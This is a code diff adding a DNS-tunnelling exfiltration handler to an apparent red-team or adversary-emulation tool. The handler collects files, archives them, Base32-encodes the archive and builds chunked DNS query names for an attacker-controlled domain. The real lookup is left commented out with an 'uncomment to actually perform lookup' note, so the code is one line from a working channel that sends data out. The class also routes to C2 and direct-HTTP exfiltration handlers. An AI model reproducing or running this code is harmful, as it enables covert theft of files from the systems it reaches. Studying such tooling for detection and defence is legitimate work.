@@ -15,6 +15,8 @@ import logging
 import glob
 import shutil
 import threading
+import socket # For basic DNS lookup simulation
+import math
 from pathlib import Path
 from typing import Dict, List, Any, Optional, Tuple
 from datetime import datetime
@@ -68,9 +70,9 @@ class Exfiltration:
         handler_map = {
             "via_c2": self._handle_exfil_via_c2,
             "direct_http": self._handle_exfil_direct_http,
-            "dns_tunnel": self._handle_not_implemented,
+            "dns_tunnel": self._handle_exfil_dns_tunnel,
             # Deprecated/Simulated
-            "data_transfer": self._handle_not_implemented, 
+            "data_transfer": self._handle_not_implemented,
             "protocol_exfiltration": self._handle_not_implemented,
         }
 
@@ -503,18 +505,136 @@ class Exfiltration:
             "details": result_details
         }
 
-    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
-         """Placeholder for techniques not yet implemented."""
-         # ... (same as before) ...
-         import inspect
-         technique_name = "unknown"
-         try:
-              caller_frame = inspect.currentframe().f_back 
-              if caller_frame:
-                  technique_name = caller_frame.f_code.co_name.replace("_handle_", "")
-         except Exception: pass 
-         self.logger.warning(f"Exfiltration technique '{technique_name}' is not yet implemented.")
-         return { "status": "skipped", "message": f"Technique '{technique_name}' not implemented.", "technique": technique_name, "timestamp": datetime.now().isoformat(), "details": details }
+    def _handle_exfil_dns_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Collects files, encodes data, and simulates exfil via DNS queries."""
+        # Parameters:
+        # - controlled_domain: The domain name to send queries to (e.g., "exfil.mycorp.com")
+        # - chunk_size: Max chars per DNS label (default: 60)
+        # - session_id: Optional ID to distinguish different exfil sessions
+        # (Inherits collection/archiving params from _collect_files/_stage_and_archive_files)
+
+        controlled_domain = details.get("controlled_domain")
+        if not controlled_domain:
+            return {"status": "failure", "reason": "Missing 'controlled_domain' in details for dns_tunnel exfil."}
+
+        chunk_size = details.get("chunk_size", 60)
+        session_id = details.get("session_id", os.urandom(4).hex())
+
+        self.logger.info(f"Starting DNS Tunnel exfiltration simulation to domain: {controlled_domain}")
+        collected_files, total_kb, skipped = [], 0, []
+        archive_path = None
+        staging_dir = None
+        status = "failure"
+        reason = ""
+        simulated_queries = 0
+        failed_queries = 0
+
+        try:
+            # Step 1: Collect Files
+            self.logger.info("Step 1: Collecting files...")
+            collected_files, total_kb, skipped = self._collect_files(details)
+            if not collected_files:
+                 raise FileNotFoundError("No files collected for exfiltration.")
+            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB). Skipped {len(skipped)}.")
+
+            # Step 2: Stage and Archive
+            self.logger.info("Step 2: Staging and archiving files...")
+            archive_path, error_msg = self._stage_and_archive_files(collected_files, details)
+            if not archive_path:
+                raise Exception(f"Failed to create archive: {error_msg}")
+            staging_dir = os.path.dirname(archive_path)
+            archive_size_kb = Path(archive_path).stat().st_size / 1024.0
+            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")
+
+            # Step 3: Read, Encode, Chunk, and Simulate DNS Queries
+            self.logger.info("Step 3: Encoding data and simulating DNS queries...")
+            with open(archive_path, 'rb') as f:
+                archive_data = f.read()
+            
+            # Use Base32 for DNS label compatibility (alphanumeric), remove padding
+            encoded_data = base64.b32encode(archive_data).decode('ascii').rstrip('=')
+            self.logger.debug(f"Encoded data length: {len(encoded_data)} chars (Base32)")
+
+            num_chunks = math.ceil(len(encoded_data) / chunk_size)
+            self.logger.info(f"Splitting into {num_chunks} chunks of max size {chunk_size}...")
+
+            for i in range(num_chunks):
+                chunk = encoded_data[i * chunk_size : (i + 1) * chunk_size]
+                # Construct the FQDN: <chunk>.<chunk_index>.<session>.<domain>
+                fqdn = f"{chunk}.{i}.{session_id}.{controlled_domain}"
+                
+                # Check FQDN length constraints (max 253 total, max 63 per label)
+                if len(fqdn) > 253:
+                     self.logger.warning(f"Skipping query, generated FQDN too long ({len(fqdn)} chars): {fqdn[:100]}..." )
+                     failed_queries += 1
+                     continue
+                labels = fqdn.split('.')
+                if any(len(label) > 63 for label in labels):
+                    self.logger.warning(f"Skipping query, generated label too long in FQDN: {fqdn}")
+                    failed_queries += 1
+                    continue
+
+                # Simulate DNS query
+                simulated_queries += 1
+                try:
+                    # Using gethostbyname for basic simulation - uses system resolver
+                    # A real tool might use dnspython or raw sockets
+                    self.logger.debug(f"Simulating DNS query for: {fqdn}")
+                    # socket.gethostbyname(fqdn) # Uncomment to actually perform lookup
+                    # Add a small delay to avoid overwhelming resolver/network?
+                    time.sleep(0.05)
+                except socket.gaierror as e:
+                    # Expected if domain doesn't resolve or network issue
+                    self.logger.warning(f"Simulated DNS query for {fqdn} failed (as expected?): {e}")
+                    # In a real scenario, this might indicate success (server received it)
+                    # or failure (network block). Hard to tell in simulation.
+                    # Let's count it as a failed query attempt for simulation clarity
+                    failed_queries += 1
+                except Exception as e:
+                     self.logger.error(f"Unexpected error during simulated DNS query for {fqdn}: {e}")
+                     failed_queries += 1
+            
+            if simulated_queries > 0 and failed_queries < simulated_queries:
+                status = "success" # Assume success if most queries simulated without error
+                reason = f"Simulated {simulated_queries} DNS queries for {len(encoded_data)} chars of data. {failed_queries} queries failed lookup (may be expected)."
+                self.logger.info("DNS Tunnel simulation finished.")
+            else:
+                 reason = f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, {failed_queries} failed." 
+                 self.logger.error(reason)
+
+        except FileNotFoundError as e:
+             reason = f"File collection/staging failed: {e}"
+             self.logger.error(reason)
+        except Exception as e:
+             reason = f"Exfiltration process failed: {e}"
+             self.logger.error(reason, exc_info=True)
+        finally:
+             # Step 4: Cleanup Staging Directory
+             if staging_dir and os.path.exists(staging_dir):
+                 self.logger.info(f"Step 4: Cleaning up staging directory: {staging_dir}")
+                 try:
+                      shutil.rmtree(staging_dir)
+                      self.logger.debug("Staging directory removed.")
+                 except Exception as e_clean:
+                      self.logger.error(f"Failed to clean up staging directory {staging_dir}: {e_clean}")
+
+        return {
+            "status": status,
+            "technique": "dns_tunnel",
+            "controlled_domain": controlled_domain,
+            "session_id": session_id,
+            "files_collected_count": len(collected_files),
+            "archive_size_kb": round(archive_size_kb, 2) if archive_path else 0,
+            "encoded_data_chars": len(encoded_data) if 'encoded_data' in locals() else 0,
+            "simulated_queries": simulated_queries,
+            "failed_queries": failed_queries,
+            "reason": reason if status != "success" else f"Successfully simulated {simulated_queries} DNS queries."
+        }
+
+    def _handle_not_implemented(self, details: Dict[str, Any], method_name: str = "Unknown") -> Dict[str, Any]:
+        """Placeholder for exfiltration techniques not yet implemented."""
+        self.logger.warning(f"Exfiltration method '{method_name}' is not implemented.")
+        return {"status": "not_implemented", "details": {"error": f"Method '{method_name}' not implemented."}}
 
     def _log_error(self, message: str, exc_info=False) -> None:
         """Log errors using the initialized logger."""
